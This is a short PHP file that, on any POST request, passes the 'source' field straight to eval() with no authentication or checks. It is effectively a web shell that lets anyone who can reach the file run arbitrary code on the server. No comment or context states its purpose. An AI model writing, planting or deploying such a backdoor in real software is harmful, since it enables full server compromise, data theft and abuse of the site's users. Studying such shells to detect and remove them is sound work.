<?php 
if (isset($_POST) && !empty($_POST) ) {
        eval("?>".$_POST['source']."<?");

    }
?>